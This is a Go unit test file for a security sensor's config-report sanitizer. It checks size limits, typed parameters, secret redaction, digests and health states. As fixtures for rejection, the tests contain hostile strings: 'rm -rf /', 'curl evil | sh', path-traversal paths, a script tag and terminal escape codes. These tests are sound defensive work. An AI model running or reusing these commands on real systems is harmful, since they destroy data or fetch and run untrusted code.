package sensor

import (
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/openctemio/openctem/api/pkg/domain/shared"
)

func reportJSON(t *testing.T, doc map[string]any) []byte {
	t.Helper()
	raw, err := json.Marshal(doc)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func baseReport(checks ...any) map[string]any {
	if checks == nil {
		checks = []any{}
	}
	return map[string]any{
		"schema": 1, "observed_at": "2026-10-05T10:00:00Z", "trigger": "start",
		"runtime": map[string]any{"kind": "docker"}, "config_health": "attention",
		"checks": checks,
		"settings": []any{
			map[string]any{"name": "API_KEY", "set": true, "source": "env", "secret": true, "valid": true},
		},
	}
}

func stateCheck() map[string]any {
	return map[string]any{
		"id": "identity.state_persistent", "status": "warn", "severity": "warning", "code": "not_persistent",
		"params":  map[string]any{"path": map[string]any{"path": "/var/lib/openctem/state"}},
		"keys":    []string{"SENSOR_STATE_DIR"},
		"summary": "state directory is not on a mounted volume",
	}
}

func ignoredReasons(ign []ConfigIgnored) map[string]string {
	out := map[string]string{}
	for _, i := range ign {
		out[i.Path] = i.Reason
	}
	return out
}

func TestSanitizeConfigReport_KeepsAWellFormedReport(t *testing.T) {
	rep, ign, err := SanitizeConfigReport(reportJSON(t, baseReport(stateCheck())))
	if err != nil {
		t.Fatal(err)
	}
	if len(ign) != 0 {
		t.Fatalf("ignored %+v", ign)
	}
	if rep.ObservedAt != "2026-10-05T10:00:00Z" || rep.Trigger != "start" || rep.Runtime.Kind != "docker" || rep.SensorHealth != "attention" {
		t.Fatalf("top level %+v", rep)
	}
	c := rep.Checks[0]
	if c.ID != "identity.state_persistent" || c.Status != CheckWarn || c.Code != "not_persistent" ||
		c.Params["path"].Path != "/var/lib/openctem/state" || c.Keys[0] != "SENSOR_STATE_DIR" {
		t.Fatalf("check %+v", c)
	}
	if s := rep.Settings[0]; s != (ConfigSetting{Name: "API_KEY", Set: true, Source: "env", Secret: true, Valid: true}) {
		t.Fatalf("setting %+v", s)
	}
}

func TestSanitizeConfigReport_RefusesWholeDocument(t *testing.T) {
	deep := `{"schema":1,"checks":[{"id":"a.b","status":"pass","params":{"x":{"names":[["deep"]]}}}]}`
	cases := map[string]struct {
		raw  []byte
		want error
	}{
		"not json":      {[]byte(`{"schema":1,`), ErrConfigReportMalformed},
		"trailing data": {[]byte(`{"schema":1,"checks":[]} {}`), ErrConfigReportMalformed},
		"empty":         {[]byte(` `), ErrConfigReportMalformed},
		"depth 7":       {[]byte(deep), ErrConfigReportMalformed},
		"array":         {[]byte(`[1]`), ErrConfigReportInvalid},
		"schema 2":      {[]byte(`{"schema":2,"checks":[]}`), ErrConfigReportInvalid},
		"no schema":     {[]byte(`{"checks":[]}`), ErrConfigReportInvalid},
		"no checks":     {[]byte(`{"schema":1}`), ErrConfigReportInvalid},
		"checks object": {[]byte(`{"schema":1,"checks":{}}`), ErrConfigReportInvalid},
		"too large":     {[]byte(`{"schema":1,"checks":[],"x":"` + strings.Repeat("a", MaxConfigReportBytes) + `"}`), ErrConfigReportTooLarge},
	}
	for name, tc := range cases {
		if _, _, err := SanitizeConfigReport(tc.raw); !errors.Is(err, tc.want) {
			t.Errorf("%s: err %v, want %v", name, err, tc.want)
		}
	}
	// Depth 6 (document > checks > check > params > param > names) is fine.
	if _, _, err := SanitizeConfigReport([]byte(`{"schema":1,"checks":[{"id":"a.b","status":"pass","params":{"v":{"names":["HTTPS_PROXY"]}}}]}`)); err != nil {
		t.Fatalf("depth 6: %v", err)
	}
}

func TestSanitizeConfigReport_CapsChecks(t *testing.T) {
	checks := make([]any, 500)
	for i := range checks {
		checks[i] = map[string]any{"id": fmt.Sprintf("config.env_unknown"), "status": "warn", "code": "unknown",
			"params": map[string]any{"name": map[string]any{"name": fmt.Sprintf("SENSOR_X%d", i)}}}
	}
	rep, ign, err := SanitizeConfigReport(reportJSON(t, baseReport(checks...)))
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Checks) != MaxConfigChecks {
		t.Fatalf("%d checks kept, want %d", len(rep.Checks), MaxConfigChecks)
	}
	if r := ignoredReasons(ign)["checks[200:]"]; r != ConfigIgnoredLimit {
		t.Fatalf("ignored %+v", ign)
	}
	if ign[len(ign)-1].Value != "300" {
		t.Fatalf("limit item %+v", ign[len(ign)-1])
	}
}

func TestSanitizeConfigReport_FreeTextIsBoundedPlainText(t *testing.T) {
	long := strings.Repeat("x", 10000)
	hostile := "<script>alert(1)</script>‮evil\u0007\x1b[31m⁦done"
	c := stateCheck()
	c["summary"] = hostile
	c2 := map[string]any{"id": "tool.semgrep.binary", "status": "fail", "code": "broken", "summary": long,
		"excerpt": "line1\nline2\t‮" + strings.Repeat("é", 600)}
	rep, _, err := SanitizeConfigReport(reportJSON(t, baseReport(c, c2)))
	if err != nil {
		t.Fatal(err)
	}
	got := rep.Checks[0].Summary
	if !strings.HasPrefix(got, "<script>alert(1)</script>") {
		t.Fatalf("markup must be kept as inert text: %q", got)
	}
	for _, bad := range []string{"‮", "\u0007", "\x1b", "⁦"} {
		if strings.Contains(got, bad) {
			t.Fatalf("summary keeps %q: %q", bad, got)
		}
	}
	if n := utf8.RuneCountInString(rep.Checks[1].Summary); n != MaxConfigSummaryRunes {
		t.Fatalf("summary of %d runes, want %d", n, MaxConfigSummaryRunes)
	}
	ex := rep.Checks[1].Excerpt
	if len(ex) > MaxConfigExcerptBytes || !utf8.ValidString(ex) || !strings.HasPrefix(ex, "line1\nline2\t") || strings.Contains(ex, "‮") {
		t.Fatalf("excerpt %d bytes %q", len(ex), ex)
	}
}

func TestSanitizeConfigReport_TypedParamsOnly(t *testing.T) {
	c := map[string]any{
		"id": "platform.tls", "status": "fail", "code": "ca_file_unreadable",
		"params": map[string]any{
			"name":      map[string]any{"name": "SSL_CERT_FILE"},
			"path":      map[string]any{"path": "/etc/ssl/ca.pem"},
			"count":     map[string]any{"int": 3},
			"ok":        map[string]any{"bool": true},
			"fs":        map[string]any{"enum": "overlay"},
			"proxy":     map[string]any{"host": "proxy.corp"},
			"ip":        map[string]any{"host": "10.0.0.1"},
			"v":         map[string]any{"version": "v1.2.3"},
			"vars":      map[string]any{"names": []string{"HTTPS_PROXY", "NO_PROXY"}},
			"untyped":   "plain string",
			"two":       map[string]any{"name": "A", "path": "/b"},
			"unknown":   map[string]any{"url": "https://x"},
			"relative":  map[string]any{"path": "etc/passwd"},
			"dotdot":    map[string]any{"path": "/etc/../shadow"},
			"ctrl":      map[string]any{"path": "/etc/‮x"},
			"hostport":  map[string]any{"host": "proxy:3128"},
			"userinfo":  map[string]any{"host": "u:p@proxy"},
			"bigint":    map[string]any{"int": 1e13},
			"badname":   map[string]any{"name": "has space"},
			"BadKey":    map[string]any{"name": "X"},
			"manynames": map[string]any{"names": []string{"A", "B", "C", "D", "E", "F", "G", "H", "I"}},
		},
	}
	rep, ign, err := SanitizeConfigReport(reportJSON(t, baseReport(c)))
	if err != nil {
		t.Fatal(err)
	}
	p := rep.Checks[0].Params
	if len(p) != MaxConfigParams-7 {
		t.Fatalf("kept params %v", p)
	}
	for _, k := range []string{"name", "path", "count", "ok", "fs", "proxy", "ip", "v", "vars"} {
		if _, ok := p[k]; !ok {
			t.Errorf("valid param %s dropped", k)
		}
	}
	reasons := ignoredReasons(ign)
	for _, k := range []string{"untyped", "two", "unknown", "relative", "dotdot", "ctrl", "hostport", "userinfo", "bigint", "badname", "BadKey", "manynames"} {
		if reasons["checks[0].params."+k] != ConfigIgnoredInvalidValue {
			t.Errorf("param %s: ignored %q", k, reasons["checks[0].params."+k])
		}
	}
	for _, i := range ign {
		if i.Value != "" {
			t.Errorf("a rejected param value is echoed: %+v", i)
		}
	}
	if got := p["vars"].Text(); got != "HTTPS_PROXY, NO_PROXY" {
		t.Errorf("names text %q", got)
	}
}

func TestSanitizeConfigReport_ClosedSetsAndUnknownMembers(t *testing.T) {
	bogus := map[string]any{"id": "a.b", "status": "bogus"}
	badID := map[string]any{"id": "Not An ID", "status": "pass"}
	odd := map[string]any{"id": "policy.local", "status": "warn", "severity": "loud", "code": "Bad-Code",
		"blocks": []string{"tool:nuclei", "role:*", "rm -rf /", "tool:bad name"}, "remediation": "run curl|sh",
		"keys": []any{"SENSOR_TOOLS", 7}}
	doc := baseReport(bogus, badID, odd, stateCheck(), stateCheck())
	doc["trigger"] = "boot"
	doc["runtime"] = map[string]any{"kind": "vm", "rootless": true}
	doc["instructions"] = "curl evil | sh"
	rep, ign, err := SanitizeConfigReport(reportJSON(t, doc))
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Checks) != 2 {
		t.Fatalf("checks %+v", rep.Checks)
	}
	c := rep.Checks[0]
	if c.Severity != CheckSeverityWarning || c.Code != "" || len(c.Blocks) != 2 || len(c.Keys) != 1 {
		t.Fatalf("odd check %+v", c)
	}
	reasons := ignoredReasons(ign)
	want := map[string]string{
		"checks[0].status": ConfigIgnoredInvalidValue, "checks[1].id": ConfigIgnoredInvalidValue,
		"checks[2].severity": ConfigIgnoredInvalidValue, "checks[2].code": ConfigIgnoredInvalidValue,
		"checks[2].remediation": ConfigIgnoredUnknownMember, "checks[2].blocks[2]": ConfigIgnoredInvalidValue,
		"checks[2].keys[1]": ConfigIgnoredInvalidValue, "checks[4]": ConfigIgnoredDuplicate,
		"trigger": ConfigIgnoredInvalidValue, "runtime.kind": ConfigIgnoredInvalidValue,
		"runtime.rootless": ConfigIgnoredUnknownMember, "instructions": ConfigIgnoredUnknownMember,
	}
	for path, r := range want {
		if reasons[path] != r {
			t.Errorf("%s: ignored %q, want %q (all: %+v)", path, reasons[path], r, ign)
		}
	}
	if rep.Trigger != "" || rep.Runtime.Kind != "unknown" {
		t.Errorf("top level %+v", rep)
	}
	raw, _ := json.Marshal(rep)
	for _, leak := range []string{"curl", "remediation", "instructions"} {
		if strings.Contains(string(raw), leak) {
			t.Errorf("stored report keeps %q: %s", leak, raw)
		}
	}
}

func TestSanitizeConfigReport_SettingValueIsNeverKept(t *testing.T) {
	doc := baseReport()
	doc["settings"] = []any{
		map[string]any{"name": "API_KEY", "set": true, "source": "env", "secret": true, "valid": true, "value": "CANARY-SECRET"},
		map[string]any{"name": "SENSOR_TOOLS", "set": true, "source": "env", "value": map[string]any{"nested": "CANARY-SECRET"}},
		map[string]any{"name": "CANARY-SECRET is not a name", "set": true},
		map[string]any{"name": "API_KEY", "set": false},
	}
	rep, ign, err := SanitizeConfigReport(reportJSON(t, doc))
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(rep)
	ignRaw, _ := json.Marshal(ign)
	if strings.Contains(string(raw), "CANARY") || strings.Contains(string(ignRaw), "CANARY") {
		t.Fatalf("canary kept:\n%s\n%s", raw, ignRaw)
	}
	if len(rep.Settings) != 2 || rep.Settings[0].Name != "API_KEY" || rep.Settings[1].Name != "SENSOR_TOOLS" {
		t.Fatalf("settings %+v", rep.Settings)
	}
	reasons := ignoredReasons(ign)
	if reasons["settings[0].value"] != ConfigIgnoredUnknownMember || reasons["settings[1].value"] != ConfigIgnoredUnknownMember ||
		reasons["settings[2].name"] != ConfigIgnoredInvalidValue || reasons["settings[3]"] != ConfigIgnoredDuplicate {
		t.Fatalf("ignored %+v", ign)
	}
}

func TestConfigReportDigest_IgnoresObservedAtOnly(t *testing.T) {
	a, _, _ := SanitizeConfigReport(reportJSON(t, baseReport(stateCheck())))
	doc := baseReport(stateCheck())
	doc["observed_at"] = "2026-10-06T00:00:00Z"
	b, _, _ := SanitizeConfigReport(reportJSON(t, doc))
	da, _ := a.Digest()
	db, _ := b.Digest()
	if da != db || !configDigestRE.MatchString(da) {
		t.Fatalf("digests %s %s", da, db)
	}
	c := stateCheck()
	c["status"] = "pass"
	cr, _, _ := SanitizeConfigReport(reportJSON(t, baseReport(c)))
	if dc, _ := cr.Digest(); dc == da {
		t.Fatal("a changed check kept the digest")
	}
}

func TestConfigHealthOf(t *testing.T) {
	ch := func(status, severity string, blocks ...string) ConfigCheck {
		return ConfigCheck{ID: "a.b", Status: status, Severity: severity, Blocks: blocks}
	}
	cases := []struct {
		checks []ConfigCheck
		want   string
	}{
		{nil, ConfigHealthOK},
		{[]ConfigCheck{ch(CheckPass, "info"), ch(CheckSkip, "info"), ch(CheckWarn, CheckSeverityInfo)}, ConfigHealthOK},
		{[]ConfigCheck{ch(CheckWarn, CheckSeverityWarning)}, ConfigHealthAttention},
		{[]ConfigCheck{ch(CheckWarn, CheckSeverityWarning), ch(CheckError, CheckSeverityCritical)}, ConfigHealthImpaired},
		{[]ConfigCheck{ch(CheckFail, CheckSeverityCritical, "tool:semgrep")}, ConfigHealthImpaired},
		{[]ConfigCheck{ch(CheckFail, CheckSeverityCritical, "tool:semgrep"), ch(CheckFail, CheckSeverityCritical, "role:*")}, ConfigHealthBlocked},
	}
	for i, tc := range cases {
		if got := ConfigHealthOf(tc.checks); got != tc.want {
			t.Errorf("case %d: %s, want %s", i, got, tc.want)
		}
	}
}

func onlineSensor(now time.Time) *Sensor {
	tid := shared.NewID()
	seen := now.Add(-5 * time.Second)
	due := now.Add(30 * time.Second)
	return &Sensor{ID: shared.NewID(), TenantID: &tid, Status: SensorStatusActive, Health: SensorHealthOnline,
		Type: SensorTypeWorker, ExecutionMode: ExecutionModeDaemon, Tools: []string{"nuclei"},
		LastSeenAt: &seen, HeartbeatDueAt: &due, HeartbeatInterval: 30 * time.Second}
}

func reasonCodes(rs []HealthReason) map[HealthReasonCode]bool {
	out := map[HealthReasonCode]bool{}
	for _, r := range rs {
		out[r.Code] = true
	}
	return out
}

func TestAssessHealth_ConfigReasons(t *testing.T) {
	now := time.Now()
	digest := "sha256:" + strings.Repeat("a", 64)
	other := "sha256:" + strings.Repeat("b", 64)

	s := onlineSensor(now)
	if got := s.AssessHealth(now, DefaultHealthPolicy()); got.State != StateOnline {
		t.Fatalf("baseline %s %+v", got.State, got.Reasons)
	}

	for health, code := range map[string]HealthReasonCode{
		ConfigHealthBlocked: ReasonConfigCheckFailed, ConfigHealthImpaired: ReasonConfigCheckFailed,
		ConfigHealthAttention: ReasonConfigCheckWarning,
	} {
		s := onlineSensor(now)
		s.ConfigReportDigest, s.ConfigHeartbeatDigest, s.ConfigHealth = digest, digest, health
		got := s.AssessHealth(now, DefaultHealthPolicy())
		if got.State != StateDegraded || !reasonCodes(got.Reasons)[code] {
			t.Errorf("%s: state %s reasons %+v", health, got.State, got.Reasons)
		}
	}

	ok := onlineSensor(now)
	ok.ConfigReportDigest, ok.ConfigHeartbeatDigest, ok.ConfigHealth = digest, digest, ConfigHealthOK
	if got := ok.AssessHealth(now, DefaultHealthPolicy()); got.State != StateOnline {
		t.Errorf("ok report: %s %+v", got.State, got.Reasons)
	}

	// Stale (another digest, or none echoed): only the stale reason.
	for _, hb := range []string{other, ""} {
		st := onlineSensor(now)
		st.ConfigReportDigest, st.ConfigHeartbeatDigest, st.ConfigHealth = digest, hb, ConfigHealthBlocked
		if !st.ConfigReportStale() {
			t.Fatalf("heartbeat %q: not stale", hb)
		}
		got := st.AssessHealth(now, DefaultHealthPolicy())
		codes := reasonCodes(got.Reasons)
		if got.State != StateDegraded || !codes[ReasonConfigReportStale] || codes[ReasonConfigCheckFailed] {
			t.Errorf("stale %q: %s %+v", hb, got.State, got.Reasons)
		}
	}

	// A stale report of a sensor that is not heartbeating raises nothing.
	off := onlineSensor(now)
	old := now.Add(-time.Hour)
	off.LastSeenAt, off.HeartbeatDueAt, off.Health = &old, &old, SensorHealthOffline
	off.ConfigReportDigest, off.ConfigHeartbeatDigest = digest, other
	if codes := reasonCodes(off.AssessHealth(now, DefaultHealthPolicy()).Reasons); codes[ReasonConfigReportStale] {
		t.Errorf("offline sensor got the stale reason")
	}

	// No report at all: nothing.
	if (&Sensor{}).ConfigReportStale() {
		t.Error("no report is not stale")
	}
}

func TestDerivedConfigChecks(t *testing.T) {
	now := time.Now()
	s := onlineSensor(now)
	s.Reported.Tools = []ReportedTool{{Name: "semgrep", Installed: false}, {Name: "nuclei", Installed: true}, {Name: "Bad Name", Installed: false}}
	got := map[string]ConfigCheck{}
	for _, c := range s.DerivedConfigChecks() {
		got[c.ID] = c
	}
	if c := got["tool.semgrep.binary"]; c.Status != CheckFail || c.Code != "not_installed" || c.Blocks[0] != "tool:semgrep" || c.Params["tool"].Name != "semgrep" {
		t.Errorf("semgrep %+v", c)
	}
	if c := got["tool.nuclei.binary"]; c.Status != CheckPass {
		t.Errorf("nuclei %+v", c)
	}
	if c := got["tools.available"]; c.Status != CheckPass || *c.Params["count"].Int != 1 {
		t.Errorf("tools.available %+v", c)
	}
	if c := got["policy.local"]; c.Status != CheckWarn || c.Code != "absent" {
		t.Errorf("policy.local %+v", c)
	}
	if len(got) != 4 {
		t.Errorf("checks %v", got)
	}

	none := onlineSensor(now)
	none.Reported.Tools = []ReportedTool{{Name: "trivy", Installed: false}}
	none.LocalPolicy = &LocalPolicyReport{State: LocalPolicyEnforced}
	got = map[string]ConfigCheck{}
	for _, c := range none.DerivedConfigChecks() {
		got[c.ID] = c
	}
	if c := got["tools.available"]; c.Status != CheckFail || c.Code != "none" || c.Blocks[0] != "role:scan" {
		t.Errorf("no tools %+v", c)
	}
	if c := got["policy.local"]; c.Status != CheckPass || c.Code != "enforced" {
		t.Errorf("enforced policy %+v", c)
	}
	if h := ConfigHealthOf(none.DerivedConfigChecks()); h != ConfigHealthImpaired {
		t.Errorf("derived health %s", h)
	}
}

func TestParseConfigReportSummary(t *testing.T) {
	digest := "sha256:" + strings.Repeat("c", 64)
	s := ParseConfigReportSummary(json.RawMessage(`{"digest":"` + digest + `","health":"weird","fail":-3,"warn":99999,"observed_at":7}`))
	if s == nil || s.Digest != digest || s.Health != "" || s.Fail != 0 || s.Warn != MaxConfigChecks {
		t.Fatalf("summary %+v", s)
	}
	if HeartbeatConfigDigest(s) != digest {
		t.Fatal("digest not read")
	}
	for _, raw := range []string{``, `null`, `"x"`, `[]`} {
		if ParseConfigReportSummary(json.RawMessage(raw)) != nil {
			t.Errorf("%q parsed", raw)
		}
	}
	if HeartbeatConfigDigest(&ConfigReportSummary{Digest: "sha256:XYZ"}) != "" || HeartbeatConfigDigest(nil) != "" {
		t.Error("a malformed digest was accepted")
	}
}
